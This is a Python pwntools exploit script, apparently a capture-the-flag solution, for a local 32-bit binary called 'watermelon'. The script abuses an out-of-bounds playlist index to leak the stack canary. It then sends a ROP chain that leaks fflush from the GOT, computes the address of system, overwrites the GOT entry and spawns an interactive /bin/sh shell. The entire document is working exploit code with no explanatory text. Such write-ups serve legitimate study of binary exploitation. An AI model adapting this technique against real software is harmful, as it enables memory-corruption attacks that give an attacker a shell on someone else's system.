#!/usr/bin/python
# coding: utf-8

from pwn import * 

# context.log_level = 'debug'
p = {}
e = {}
libc = {}

## gadgets
encrypt_funciton = 0x80487A2
bss = 0x0804cb60 + 32
pppr = 0x08048f0d
pr = 0x080487a0
ret = 0x08049ad9
offset = 0x229f0 			# fflush - system

def select(num):
	global p
	p.recvuntil('\tselect\t|\t')
	p.sendline(num)

def setName(name):
	global p
	p.recvuntil('Input your name : ')
	p.sendline(name)
	sleep(0.1)
	welcome = p.recvuntil('\n\n\n\n').strip()

	log.success(welcome)

def addPlaylist(music, artist):
	global p
	select('1')
	
	p.recvuntil('music')
	p.send(music)
	p.recvuntil('artist')
	p.send(artist)

def modifyPlaylist(index, music, artist):
	global p
	select('3')
	
	p.recvuntil('select number')
	p.sendline(str(index))
	
	p.recvuntil('music')
	p.send(music)
	
	p.recvuntil('artist')
	p.send(artist)

def printPlaylist():
	global p
	select('2')
	print p.recvuntil('\n\n\n\n\n\n\n').strip()

def getCanary():
	global p
	modifyPlaylist(100, 'music', 'A' * 21)
	select('2')
	p.recvuntil('A' * 20)
	canary = u32(p.recv(4)) - ord('A')
	log.info("the leaked canary : {0}".format(hex(canary)))

	return canary

def POC(canary):
	payload = 'A' * 20
	payload += p32(canary)
	payload += "DUMM" * 3
	payload += p32(encrypt_funciton)

	modifyPlaylist(100, 'music', payload)

def exploit(canary):
	# read(0, &bss, 8);
	global p
	global e

	binsh = '/bin/sh\x00'

	payload = 'A' * 20
	payload += p32(canary)
	payload += 'DUMM' * 3

	payload += p32(e.plt['read'])
	payload += p32(pppr)
	payload += p32(0)
	payload += p32(bss)
	payload += p32(len(binsh))

	# write(1, &fflush@got, 4);
	payload += p32(e.plt['write'])
	payload += p32(pppr)
	payload += p32(1)
	payload += p32(e.got['fflush'])
	payload += p32(4)

	# read(0, &read@got, 4);
	payload += p32(e.plt['read'])
	payload += p32(pppr)
	payload += p32(0)
	payload += p32(e.got['fflush'])
	payload += p32(4)

	# system("/bin/sh");
	payload += p32(e.plt['fflush'])
	payload += p32(encrypt_funciton)
	payload += p32(bss)


	modifyPlaylist(100, 'music', payload)
	select('4')
	print p.recv(1024)


	p.send(binsh)

	log.info('sent payload')
	log.info('payload length is {0} bytes'.format(len(payload)))
	
	p.recvuntil('BYE BYE\n\n')

	fflush_got = u32(p.recv(4))
	system_got = fflush_got - offset

	log.success('leaked fflush@got : {0}'.format(hex(fflush_got)))
	log.success('leaked system@got : {0}'.format(hex(system_got)))

	p.send(p32(system_got))
	p.interactive()


def main():
	global p
	global e
	global libc

	filename = './watermelon'
	
	e = ELF(filename)
	p = process(e.path)
	libc = e.libc

	setName('ch4n3')

	for _ in range(100):
		addPlaylist('a', 'b')

	canary = getCanary()
	# POC(canary)
	# printPlaylist()
	exploit(canary)
	# print e.got


if __name__ == '__main__':
	main()
